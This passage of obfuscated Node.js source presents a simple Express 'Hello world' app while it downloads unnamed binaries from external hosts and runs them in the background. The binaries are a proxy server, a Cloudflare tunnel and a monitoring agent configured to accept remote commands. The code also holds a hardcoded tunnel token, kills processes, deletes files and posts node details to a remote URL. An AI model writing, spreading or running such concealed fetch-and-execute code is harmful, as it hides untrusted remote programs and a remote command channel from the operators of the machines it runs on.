const _0x3e978b=_0xff08;(function(_0x27efc7,_0xe50561){const _0x236dad={_0x51b35e:0x15f,_0x577e13:0xc8,_0x380584:0x107,_0xb72d79:0xbb,_0x2602cd:0x138,_0x3d5619:0x9e,_0xf578d3:0x110,_0x35dad3:0xb8,_0x426268:0x105},_0xa5300f=_0xff08,_0x582fae=_0x27efc7();while(!![]){try{const _0x273c48=-parseInt(_0xa5300f(_0x236dad._0x51b35e))/0x1+parseInt(_0xa5300f(_0x236dad._0x577e13))/0x2*(parseInt(_0xa5300f(_0x236dad._0x380584))/0x3)+-parseInt(_0xa5300f(0x10d))/0x4*(parseInt(_0xa5300f(_0x236dad._0xb72d79))/0x5)+-parseInt(_0xa5300f(_0x236dad._0x2602cd))/0x6+parseInt(_0xa5300f(_0x236dad._0x3d5619))/0x7+parseInt(_0xa5300f(_0x236dad._0xf578d3))/0x8*(parseInt(_0xa5300f(_0x236dad._0x35dad3))/0x9)+-parseInt(_0xa5300f(_0x236dad._0x426268))/0xa*(parseInt(_0xa5300f(0xaf))/0xb);if(_0x273c48===_0xe50561)break;else _0x582fae['push'](_0x582fae['shift']());}catch(_0x269c58){_0x582fae['push'](_0x582fae['shift']());}}}(_0x3778,0x296e5));const express=require(_0x3e978b(0x12a)),app=express(),axios=require(_0x3e978b(0xda)),os=require('os'),fs=require('fs'),path=require(_0x3e978b(0xeb)),{promisify}=require('util'),exec=promisify(require('child_process')[_0x3e978b(0xac)]),UPLOAD_URL=process[_0x3e978b(0x164)][_0x3e978b(0xba)]||'',PROJECT_URL=process['env'][_0x3e978b(0x102)]||'',AUTO_ACCESS=process[_0x3e978b(0x164)][_0x3e978b(0x125)]||![],FILE_PATH=process[_0x3e978b(0x164)][_0x3e978b(0x132)]||_0x3e978b(0x12f),SUB_PATH=process['env'][_0x3e978b(0xc6)]||_0x3e978b(0x118),PORT=process[_0x3e978b(0x164)][_0x3e978b(0x12e)]||process[_0x3e978b(0x164)][_0x3e978b(0x16c)]||0xbb8,UUID=process[_0x3e978b(0x164)][_0x3e978b(0xc2)]||'378f38ab-8f4c-4964-b242-deb52f04c3c2',NEZHA_SERVER=process[_0x3e978b(0x164)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3e978b(0x164)][_0x3e978b(0x163)]||'',NEZHA_KEY=process[_0x3e978b(0x164)][_0x3e978b(0xb7)]||'',ARGO_DOMAIN=process[_0x3e978b(0x164)][_0x3e978b(0x13c)]||_0x3e978b(0xbe),ARGO_AUTH=process[_0x3e978b(0x164)][_0x3e978b(0x128)]||_0x3e978b(0xdd),ARGO_PORT=process[_0x3e978b(0x164)][_0x3e978b(0x115)]||0xcb20,CFIP=process[_0x3e978b(0x164)][_0x3e978b(0x16b)]||_0x3e978b(0xf8),CFPORT=process[_0x3e978b(0x164)]['CFPORT']||0x1bb,NAME=process[_0x3e978b(0x164)][_0x3e978b(0xb3)]||_0x3e978b(0x129);!fs[_0x3e978b(0x150)](FILE_PATH)?(fs[_0x3e978b(0x11f)](FILE_PATH),console[_0x3e978b(0x140)](FILE_PATH+'\x20is\x20created')):console[_0x3e978b(0x140)](FILE_PATH+_0x3e978b(0xee));function generateRandomName(){const _0x3e008d={_0x28bc6f:0x15b,_0x11f382:0xe9,_0x3a3030:0xff,_0x25ea40:0xe6},_0x4ca90a=_0x3e978b,_0x406c0f=_0x4ca90a(_0x3e008d._0x28bc6f);let _0x6570fe='';for(let _0x58d195=0x0;_0x58d195<0x6;_0x58d195++){_0x6570fe+=_0x406c0f[_0x4ca90a(_0x3e008d._0x11f382)](Math[_0x4ca90a(_0x3e008d._0x3a3030)](Math[_0x4ca90a(_0x3e008d._0x25ea40)]()*_0x406c0f['length']));}return _0x6570fe;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3e978b(0xf1)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x3e978b(0xf1)](FILE_PATH,webName),botPath=path[_0x3e978b(0xf1)](FILE_PATH,botName),subPath=path[_0x3e978b(0xf1)](FILE_PATH,_0x3e978b(0x169)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,_0x3e978b(0x100)),configPath=path[_0x3e978b(0xf1)](FILE_PATH,_0x3e978b(0x14f));function _0x3778(){const _0x136bc3=['ARGO_DOMAIN:','from','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','\x0a\x20\x20credentials-file:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','--tls','fileUrl','platform','https://api.ip.sb/geoip','exec','Nodes\x20uploaded\x20successfully','toString','11ruvFWk','rm\x20-rf\x20','freedom','promises','NAME','/config.json\x20>/dev/null\x202>&1\x20&','/vless-argo','get','NEZHA_KEY','9WrjYCF','vless','UPLOAD_URL','55lpyWGF','\x20>/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','fbba.frea.dpdns.org','close','https://oooo.serv00.net/add-url','2096','UUID','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Error\x20downloading\x20files:','pkill\x20-f\x20\x22[','SUB_PATH','isFile','4oRtajo','all','?security=tls&sni=','Unknown','web\x20running\x20error:\x20','push','blackhole','statSync','has','status','?encryption=none&security=tls&sni=','utf8','none','/dev/null','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','arch','/tunnel.yml\x20run','Download\x20','axios','Error\x20in\x20startserver:','filter','eyJhIjoiMzc1ZmE2ZDlhZTg2OWI3NzJhNDA3MzM3MGE4YTg3NjUiLCJ0IjoiMTI2NmFjZjEtMWQ0ZC00Nzc1LTkyYTctZjM2Nzc4YWFmOGIzIiwicyI6Ill6YzFZamsxWlRjdFlqWTRPQzAwWVRjd0xXRXlaRGd0WVRkaU5HUmpPR0l5WkRReCJ9','\x0a\x20\x20\x20\x20','tunnel.json','/vmess-argo?ed=2560','Skipping\x20adding\x20automatic\x20access\x20task','127.0.0.1','\x20successfully','https://amd64.ssss.nyc.mn/bot','auto','random','https://arm64.ssss.nyc.mn/v1','8443','charAt','win32','path','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','trojan','\x20already\x20exists','clear','countryCode','join','finish','automatic\x20access\x20task\x20added\x20successfully','length','index.html','php\x20running\x20error:\x20','listen','162.159.38.29','\x20-p\x20','config.yaml','.exe\x20>\x20nul\x202>&1','test','writeFileSync','2087','floor','boot.log','includes','PROJECT_URL','\x20>/dev/null\x202>&1\x20&','/sub.txt\x20saved\x20successfully','218930UDDfhB','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','208578yfbZwr','block','country_code','&fp=firefox&type=ws&host=','false','application/json','34156qklyWE','\x20failed:\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','2560280loFXEZ','npm\x20running\x20error:\x20','utf-8','\x0a\x0avmess://','arm64','ARGO_PORT','Error\x20reading\x20boot.log:','send','sub','stringify','true','Empowerment\x20failed\x20for\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','org','unshift','mkdirSync','tls','\x20is\x20running','data','Content-Type','/api/add-subscriptions','AUTO_ACCESS','\x0avless://','Mozilla/5.0','ARGO_AUTH','railway','express','Error\x20executing\x20command:\x20','\x20-s\x20','https://arm64.ssss.nyc.mn/bot','SERVER_PORT','.tmp','catch','readFileSync','FILE_PATH','http','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','match','createWriteStream','\x0a\x20\x20tunnel:\x20','1040820EXsXah','forEach','fileName','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','ARGO_DOMAIN','vmess','\x0a\x0atrojan://','response','log','http://ip-api.com/json','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','443','2083','readdirSync','&path=%2Ftrojan-argo%3Fed%3D2560#','quic','stream','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/trojan-argo','nohup\x20','replace','http\x20server\x20is\x20running\x20on\x20port:','config.json','existsSync','tunnel.yml','https://arm64.ssss.nyc.mn/agent','arm','split','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','map','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','aarch64','basename','substring','abcdefghijklmnopqrstuvwxyz','/api/add-nodes','base64','error','246390eRZVDd','text/plain;\x20charset=utf-8','set','post','NEZHA_PORT','env','\x22\x20>\x20/dev/null\x202>&1','&path=%2Fvless-argo%3Fed%3D2560#','del\x20/f\x20/q\x20','message','sub.txt','taskkill\x20/f\x20/im\x20','CFIP','PORT','unlink','readFile','amd','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','App\x20is\x20running','tcp','1724072xRZfhR','\x0aclient_secret:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/vmess-argo','https://amd64.ssss.nyc.mn/web'];_0x3778=function(){return _0x136bc3;};return _0x3778();}function deleteNodes(){const _0x633a2e={_0x12c2c6:0xa4,_0x166ae4:0xae,_0x269efc:0x112,_0x477f9b:0xf4,_0x160b37:0x119},_0x31e984=_0x3e978b;try{if(!UPLOAD_URL)return;if(!fs[_0x31e984(0x150)](subPath))return;let _0x494467;try{_0x494467=fs['readFileSync'](subPath,_0x31e984(0x112));}catch{return null;}const _0x2aa1f0=Buffer[_0x31e984(_0x633a2e._0x12c2c6)](_0x494467,_0x31e984(0x15d))[_0x31e984(_0x633a2e._0x166ae4)](_0x31e984(_0x633a2e._0x269efc)),_0x3832f7=_0x2aa1f0[_0x31e984(0x154)]('\x0a')[_0x31e984(0xdc)](_0x327c31=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x31e984(0xfc)](_0x327c31));if(_0x3832f7[_0x31e984(_0x633a2e._0x477f9b)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x31e984(_0x633a2e._0x160b37)]({'nodes':_0x3832f7}),{'headers':{'Content-Type':_0x31e984(0x10c)}})['catch'](_0x1b969f=>{return null;}),null;}catch(_0x8033b0){return null;}}function cleanupOldFiles(){const _0x43621a={_0x4bea64:0x145},_0x21f212={_0x16bd15:0xf1},_0x2fd079=_0x3e978b;try{const _0x1635d0=fs[_0x2fd079(_0x43621a._0x4bea64)](FILE_PATH);_0x1635d0['forEach'](_0x204492=>{const _0x3f3cfd=_0x2fd079,_0x57cf52=path[_0x3f3cfd(_0x21f212._0x16bd15)](FILE_PATH,_0x204492);try{const _0x369c89=fs[_0x3f3cfd(0xcf)](_0x57cf52);_0x369c89[_0x3f3cfd(0xc7)]()&&fs['unlinkSync'](_0x57cf52);}catch(_0x1dc2ff){}});}catch(_0x14177e){}}async function generateConfig(){const _0x44579a={_0x4a85ac:0xb9,_0x5c6be1:0xa1,_0x14e73a:0x9d,_0x436a56:0xe2,_0x10bcf8:0xb9,_0x271c62:0xd4,_0x27d806:0xb5,_0x16dae2:0x133,_0x1d84c4:0x120,_0x3a838c:0x147,_0x620ab9:0xed,_0x3faa8e:0xd4,_0x4190b4:0x133,_0x258ece:0xb1,_0x16ad11:0xf1,_0x40d620:0x119},_0x1a72c7=_0x3e978b,_0x1b4f1b={'log':{'access':_0x1a72c7(0xd5),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1a72c7(_0x44579a._0x4a85ac),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x1a72c7(_0x44579a._0x5c6be1),'dest':0xbbb},{'path':_0x1a72c7(0x14b),'dest':0xbbc}]},'streamSettings':{'network':_0x1a72c7(_0x44579a._0x14e73a)}},{'port':0xbb9,'listen':_0x1a72c7(_0x44579a._0x436a56),'protocol':_0x1a72c7(_0x44579a._0x10bcf8),'settings':{'clients':[{'id':UUID}],'decryption':_0x1a72c7(0xd4)},'streamSettings':{'network':'tcp','security':_0x1a72c7(_0x44579a._0x271c62)}},{'port':0xbba,'listen':_0x1a72c7(0xe2),'protocol':_0x1a72c7(_0x44579a._0x10bcf8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1a72c7(_0x44579a._0x271c62)},'streamSettings':{'network':'ws','security':_0x1a72c7(_0x44579a._0x271c62),'wsSettings':{'path':_0x1a72c7(_0x44579a._0x27d806)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a72c7(_0x44579a._0x16dae2),_0x1a72c7(_0x44579a._0x1d84c4),_0x1a72c7(_0x44579a._0x3a838c)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x1a72c7(0x13d),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x1a72c7(0xa1)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a72c7(_0x44579a._0x16dae2),'tls',_0x1a72c7(_0x44579a._0x3a838c)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1a72c7(0xe2),'protocol':_0x1a72c7(_0x44579a._0x620ab9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1a72c7(_0x44579a._0x3faa8e),'wsSettings':{'path':_0x1a72c7(0x14b)}},'sniffing':{'enabled':!![],'destOverride':[_0x1a72c7(_0x44579a._0x4190b4),'tls',_0x1a72c7(0x147)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x1a72c7(_0x44579a._0x258ece),'tag':'direct'},{'protocol':_0x1a72c7(0xce),'tag':_0x1a72c7(0x108)}]};fs[_0x1a72c7(0xfd)](path[_0x1a72c7(_0x44579a._0x16ad11)](FILE_PATH,_0x1a72c7(0x14f)),JSON[_0x1a72c7(_0x44579a._0x40d620)](_0x1b4f1b,null,0x2));}function getSystemArchitecture(){const _0x311975={_0x40eaf5:0xd7,_0x3c1092:0x114},_0x2a9361=_0x3e978b,_0x29e30d=os[_0x2a9361(_0x311975._0x40eaf5)]();return _0x29e30d===_0x2a9361(0x153)||_0x29e30d===_0x2a9361(_0x311975._0x3c1092)||_0x29e30d===_0x2a9361(0x158)?_0x2a9361(0x153):_0x2a9361(0x9a);}function downloadFile(_0x567cef,_0xa051c7,_0x16d3f2){const _0x5082d8={_0x9050be:0x136},_0x56399b={_0x2958c3:0x122},_0x37cca8={_0x2d9f3a:0x16d,_0x5b4cd4:0xd9,_0x37418a:0x10e},_0x374806=_0x3e978b,_0x371f89=_0x567cef;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x3a2bf8=fs[_0x374806(_0x5082d8._0x9050be)](_0x371f89);axios({'method':_0x374806(0xb6),'url':_0xa051c7,'responseType':_0x374806(0x148)})['then'](_0x2ef533=>{const _0x4b1673={_0x230355:0x159},_0x360cb5=_0x374806;_0x2ef533[_0x360cb5(_0x56399b._0x2958c3)]['pipe'](_0x3a2bf8),_0x3a2bf8['on'](_0x360cb5(0xf2),()=>{const _0x2c0414=_0x360cb5;_0x3a2bf8[_0x2c0414(0xbf)](),console[_0x2c0414(0x140)]('Download\x20'+path[_0x2c0414(_0x4b1673._0x230355)](_0x371f89)+_0x2c0414(0xe3)),_0x16d3f2(null,_0x371f89);}),_0x3a2bf8['on'](_0x360cb5(0x15e),_0x412d2f=>{const _0x3f7424=_0x360cb5;fs[_0x3f7424(_0x37cca8._0x2d9f3a)](_0x371f89,()=>{});const _0x42a8f4=_0x3f7424(_0x37cca8._0x5b4cd4)+path[_0x3f7424(0x159)](_0x371f89)+_0x3f7424(_0x37cca8._0x37418a)+_0x412d2f['message'];console[_0x3f7424(0x15e)](_0x42a8f4),_0x16d3f2(_0x42a8f4);});})[_0x374806(0x130)](_0x24ee44=>{const _0x4b7b16=_0x374806,_0x319322='Download\x20'+path[_0x4b7b16(0x159)](_0x371f89)+'\x20failed:\x20'+_0x24ee44[_0x4b7b16(0x168)];console['error'](_0x319322),_0x16d3f2(_0x319322);});}async function downloadFilesAndRun(){const _0x153c5c={_0x51723f:0xf4,_0x305c24:0x140,_0x54ddf6:0xa7,_0x7b8c66:0x156,_0xbec354:0xc4,_0x185ccb:0x143,_0x4058c5:0xc1,_0x10c30d:0xfe,_0x45498b:0xd0,_0x3af975:0x11a,_0x6c571b:0x9f,_0x3840ca:0x14a,_0x3a9659:0x142,_0x976101:0x15e,_0x4ffdb0:0xf6,_0x55f957:0xe8,_0x33946b:0x144,_0x510616:0x101,_0x5816dd:0xf9,_0x283ea5:0xec,_0x42a9ed:0x15e,_0x373fa6:0xcc,_0x1d072b:0xa0,_0x230b41:0x106,_0x467835:0x14c,_0x3e45f1:0x12b},_0x3c69be=_0x3e978b,_0x101f3b=getSystemArchitecture(),_0x3c6604=getFilesForArchitecture(_0x101f3b);if(_0x3c6604[_0x3c69be(_0x153c5c._0x51723f)]===0x0){console[_0x3c69be(_0x153c5c._0x305c24)](_0x3c69be(_0x153c5c._0x54ddf6));return;}const _0x1225ec=_0x3c6604[_0x3c69be(_0x153c5c._0x7b8c66)](_0x4579b7=>{return new Promise((_0xf5f610,_0x5eccc9)=>{const _0x2ddc7a=_0xff08;downloadFile(_0x4579b7[_0x2ddc7a(0x13a)],_0x4579b7[_0x2ddc7a(0xa9)],(_0x5c7ab3,_0x51e23d)=>{_0x5c7ab3?_0x5eccc9(_0x5c7ab3):_0xf5f610(_0x51e23d);});});});try{await Promise[_0x3c69be(0xc9)](_0x1225ec);}catch(_0x3093c7){console[_0x3c69be(0x15e)](_0x3c69be(_0x153c5c._0xbec354),_0x3093c7);return;}function _0xd5951e(_0xd38dc9){const _0x578ac4=_0x3c69be,_0x5bb882=0x1fd;_0xd38dc9[_0x578ac4(0x139)](_0x163fd4=>{fs['existsSync'](_0x163fd4)&&fs['chmod'](_0x163fd4,_0x5bb882,_0x36fa17=>{const _0x560460=_0xff08;_0x36fa17?console[_0x560460(0x15e)](_0x560460(0x11b)+_0x163fd4+':\x20'+_0x36fa17):console['log']('Empowerment\x20success\x20for\x20'+_0x163fd4+':\x20'+_0x5bb882[_0x560460(0xae)](0x8));});});}const _0x2b7ac4=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xd5951e(_0x2b7ac4);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1979c5=NEZHA_SERVER[_0x3c69be(0x101)](':')?NEZHA_SERVER[_0x3c69be(0x154)](':')['pop']():'',_0x262357=new Set([_0x3c69be(_0x153c5c._0x185ccb),'8443',_0x3c69be(_0x153c5c._0x4058c5),_0x3c69be(_0x153c5c._0x10c30d),_0x3c69be(0x144),'2053']),_0xf1bb9d=_0x262357[_0x3c69be(_0x153c5c._0x45498b)](_0x1979c5)?_0x3c69be(_0x153c5c._0x3af975):_0x3c69be(0x10b),_0x3bb059=_0x3c69be(_0x153c5c._0x6c571b)+NEZHA_KEY+_0x3c69be(_0x153c5c._0x3840ca)+NEZHA_SERVER+_0x3c69be(0x11c)+_0xf1bb9d+_0x3c69be(0x157)+UUID;fs[_0x3c69be(0xfd)](path['join'](FILE_PATH,_0x3c69be(0xfa)),_0x3bb059);const _0x5730d8=_0x3c69be(0x14c)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x3c69be(_0x153c5c._0x3a9659);try{await exec(_0x5730d8),console[_0x3c69be(_0x153c5c._0x305c24)](phpName+_0x3c69be(0x121)),await new Promise(_0x280863=>setTimeout(_0x280863,0x3e8));}catch(_0x27bd2b){console[_0x3c69be(_0x153c5c._0x976101)](_0x3c69be(_0x153c5c._0x4ffdb0)+_0x27bd2b);}}else{let _0x56cd89='';const _0x560b57=[_0x3c69be(0x143),_0x3c69be(_0x153c5c._0x55f957),_0x3c69be(0xc1),_0x3c69be(0xfe),_0x3c69be(_0x153c5c._0x33946b),'2053'];_0x560b57[_0x3c69be(_0x153c5c._0x510616)](NEZHA_PORT)&&(_0x56cd89=_0x3c69be(0xa8));const _0x464649=_0x3c69be(0x14c)+npmPath+_0x3c69be(0x12c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3c69be(_0x153c5c._0x5816dd)+NEZHA_KEY+'\x20'+_0x56cd89+_0x3c69be(_0x153c5c._0x283ea5);try{await exec(_0x464649),console[_0x3c69be(0x140)](npmName+_0x3c69be(0x121)),await new Promise(_0x348f76=>setTimeout(_0x348f76,0x3e8));}catch(_0x262ee8){console[_0x3c69be(_0x153c5c._0x42a9ed)](_0x3c69be(0x111)+_0x262ee8);}}}else console[_0x3c69be(_0x153c5c._0x305c24)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x191f88='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x3c69be(0xb4);try{await exec(_0x191f88),console[_0x3c69be(0x140)](webName+'\x20is\x20running'),await new Promise(_0x1d1d56=>setTimeout(_0x1d1d56,0x3e8));}catch(_0x21118d){console[_0x3c69be(_0x153c5c._0x42a9ed)](_0x3c69be(_0x153c5c._0x373fa6)+_0x21118d);}if(fs['existsSync'](botPath)){let _0x4ad68d;if(ARGO_AUTH[_0x3c69be(0x135)](/^[A-Z0-9a-z=]{120,250}$/))_0x4ad68d=_0x3c69be(_0x153c5c._0x1d072b)+ARGO_AUTH;else ARGO_AUTH[_0x3c69be(0x135)](/TunnelSecret/)?_0x4ad68d=_0x3c69be(_0x153c5c._0x230b41)+FILE_PATH+_0x3c69be(0xd8):_0x4ad68d=_0x3c69be(0xbd)+FILE_PATH+_0x3c69be(0x9b)+ARGO_PORT;try{await exec(_0x3c69be(_0x153c5c._0x467835)+botPath+'\x20'+_0x4ad68d+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+'\x20is\x20running'),await new Promise(_0x188820=>setTimeout(_0x188820,0x7d0));}catch(_0x3ae140){console[_0x3c69be(0x15e)](_0x3c69be(_0x153c5c._0x3e45f1)+_0x3ae140);}}await new Promise(_0x386475=>setTimeout(_0x386475,0x1388));}function getFilesForArchitecture(_0x1ee04b){const _0x5b8ec9={_0x28478b:0x12d,_0x2d5f0d:0xe4,_0x88208f:0x152},_0x312294=_0x3e978b;let _0x11a064;_0x1ee04b===_0x312294(0x153)?_0x11a064=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x312294(_0x5b8ec9._0x28478b)}]:_0x11a064=[{'fileName':webPath,'fileUrl':_0x312294(0xa2)},{'fileName':botPath,'fileUrl':_0x312294(_0x5b8ec9._0x2d5f0d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x234b8b=_0x1ee04b===_0x312294(0x153)?_0x312294(_0x5b8ec9._0x88208f):'https://amd64.ssss.nyc.mn/agent';_0x11a064['unshift']({'fileName':npmPath,'fileUrl':_0x234b8b});}else{const _0x53792a=_0x1ee04b===_0x312294(0x153)?_0x312294(0xe7):'https://amd64.ssss.nyc.mn/v1';_0x11a064[_0x312294(0x11e)]({'fileName':phpPath,'fileUrl':_0x53792a});}}return _0x11a064;}function argoType(){const _0x254d86={_0x299aeb:0x140,_0x3185e3:0x149,_0x368ff1:0xfd,_0x3dc004:0x137,_0x310a9c:0xa6,_0x459de2:0xf1,_0x3f4b3e:0xdf,_0x40d9b6:0x151},_0x58f8a0=_0x3e978b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x58f8a0(_0x254d86._0x299aeb)](_0x58f8a0(_0x254d86._0x3185e3));return;}if(ARGO_AUTH[_0x58f8a0(0x101)]('TunnelSecret')){fs[_0x58f8a0(_0x254d86._0x368ff1)](path['join'](FILE_PATH,_0x58f8a0(0xdf)),ARGO_AUTH);const _0x36d8a0=_0x58f8a0(_0x254d86._0x3dc004)+ARGO_AUTH['split']('\x22')[0xb]+_0x58f8a0(_0x254d86._0x310a9c)+path[_0x58f8a0(_0x254d86._0x459de2)](FILE_PATH,_0x58f8a0(_0x254d86._0x3f4b3e))+_0x58f8a0(0xd6)+ARGO_DOMAIN+_0x58f8a0(0x134)+ARGO_PORT+_0x58f8a0(0x10f);fs[_0x58f8a0(0xfd)](path[_0x58f8a0(_0x254d86._0x459de2)](FILE_PATH,_0x58f8a0(_0x254d86._0x40d9b6)),_0x36d8a0);}else console['log'](_0x58f8a0(0xc3));}async function extractDomains(){const _0x13e80f={_0x242284:0xf1,_0x5be726:0x100,_0x320379:0xf4,_0x246942:0x140,_0x4a7f70:0x155,_0x50e3c4:0xbd,_0x354cb5:0x121,_0x330d39:0x15e},_0x398fda={_0x3ee1be:0x127,_0x4bb835:0x122,_0x2b2ec7:0x122,_0x46628f:0x109,_0x3bfd0a:0x122,_0x5641a7:0x109,_0x5dae36:0x122,_0x54fc4c:0x14d,_0x59b677:0xb6,_0x3489c0:0x141,_0x4fb1a5:0xd1,_0x2d4190:0xf0,_0x188556:0x122,_0x5c4f84:0x11d},_0x5ed7aa={_0x478588:0xaa,_0xa01a1b:0xea,_0x2c1290:0xfb,_0x1f35d9:0x165},_0x3f8180=_0x3e978b;let _0x142bc4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x142bc4=ARGO_DOMAIN,console[_0x3f8180(0x140)](_0x3f8180(0xa3),_0x142bc4),await _0x10aed1(_0x142bc4);else try{const _0x6c1274=fs[_0x3f8180(0x131)](path[_0x3f8180(_0x13e80f._0x242284)](FILE_PATH,_0x3f8180(_0x13e80f._0x5be726)),'utf-8'),_0x22509d=_0x6c1274[_0x3f8180(0x154)]('\x0a'),_0x474099=[];_0x22509d['forEach'](_0x2069d6=>{const _0x5c665d=_0x3f8180,_0x441b0d=_0x2069d6['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x441b0d){const _0xcbc4a9=_0x441b0d[0x1];_0x474099[_0x5c665d(0xcd)](_0xcbc4a9);}});if(_0x474099[_0x3f8180(_0x13e80f._0x320379)]>0x0)_0x142bc4=_0x474099[0x0],console[_0x3f8180(_0x13e80f._0x246942)]('ArgoDomain:',_0x142bc4),await _0x10aed1(_0x142bc4);else{console[_0x3f8180(0x140)](_0x3f8180(_0x13e80f._0x4a7f70)),fs['unlinkSync'](path[_0x3f8180(_0x13e80f._0x242284)](FILE_PATH,_0x3f8180(0x100)));async function _0x4d1da5(){const _0x5af9b6=_0x3f8180;try{process[_0x5af9b6(_0x5ed7aa._0x478588)]===_0x5af9b6(_0x5ed7aa._0xa01a1b)?await exec(_0x5af9b6(0x16a)+botName+_0x5af9b6(_0x5ed7aa._0x2c1290)):await exec(_0x5af9b6(0xc5)+botName['charAt'](0x0)+']'+botName[_0x5af9b6(0x15a)](0x1)+_0x5af9b6(_0x5ed7aa._0x1f35d9));}catch(_0x4128e1){}}_0x4d1da5(),await new Promise(_0x28b26b=>setTimeout(_0x28b26b,0xbb8));const _0x56de6a=_0x3f8180(_0x13e80f._0x50e3c4)+FILE_PATH+_0x3f8180(0x9b)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x56de6a+_0x3f8180(0x103)),console[_0x3f8180(_0x13e80f._0x246942)](botName+_0x3f8180(_0x13e80f._0x354cb5)),await new Promise(_0x5e6057=>setTimeout(_0x5e6057,0xbb8)),await extractDomains();}catch(_0x187747){console['error'](_0x3f8180(0x12b)+_0x187747);}}}catch(_0x49f14f){console[_0x3f8180(_0x13e80f._0x330d39)](_0x3f8180(0x116),_0x49f14f);}async function _0x149496(){const _0x496d35=_0x3f8180;try{const _0x416d76=await axios[_0x496d35(0xb6)](_0x496d35(0xab),{'headers':{'User-Agent':_0x496d35(_0x398fda._0x3ee1be),'timeout':0xbb8}});if(_0x416d76[_0x496d35(_0x398fda._0x4bb835)]&&_0x416d76[_0x496d35(_0x398fda._0x2b2ec7)][_0x496d35(_0x398fda._0x46628f)]&&_0x416d76['data']['isp'])return(_0x416d76[_0x496d35(_0x398fda._0x3bfd0a)][_0x496d35(_0x398fda._0x5641a7)]+'-'+_0x416d76[_0x496d35(_0x398fda._0x5dae36)]['isp'])[_0x496d35(_0x398fda._0x54fc4c)](/\s+/g,'_');}catch(_0x50159c){try{const _0x46e605=await 